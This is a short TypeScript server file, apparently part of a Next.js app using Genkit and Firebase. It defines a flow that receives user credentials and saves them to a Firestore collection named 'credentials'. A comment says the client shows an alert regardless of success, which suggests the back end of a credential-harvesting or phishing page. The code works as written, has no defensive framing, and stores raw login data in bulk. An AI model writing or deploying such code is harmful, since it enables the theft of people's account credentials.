'use server';
/**
 * @fileOverview A flow to capture user credentials and save them to Firestore.
 *
 * - captureCredentialsFlow - A Genkit flow that receives and saves user credentials.
 */

import { ai } from '@/ai/genkit';
import type { CredentialsInput } from '@/ai/types/credentials';
import { CredentialsInputSchema } from '@/ai/types/credentials';
import { initializeFirebaseServer } from '@/firebase/server';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';

export async function captureCredentials(input: CredentialsInput) {
  return await captureCredentialsFlow(input);
}

const captureCredentialsFlow = ai.defineFlow(
  {
    name: 'captureCredentialsFlow',
    inputSchema: CredentialsInputSchema,
    outputSchema: CredentialsInputSchema,
  },
  async (input: CredentialsInput) => {
    try {
      // Initialize Firebase for server-side usage
      const { firestore } = initializeFirebaseServer();

      // Get a reference to the 'credentials' collection
      const credentialsCollection = collection(firestore, 'credentials');

      // Add a new document with the credentials and a server-side timestamp
      await addDoc(credentialsCollection, {
        ...input,
        createdAt: serverTimestamp(),
      });
      
    } catch (error) {
      console.error('Error saving credentials to Firestore:', error);
      // We will still return the input to the client to complete the flow.
      // The client-side logic is designed to show the alert regardless of success or failure.
    }

    // Return the input to signal completion to the client.
    return input;
  }
);
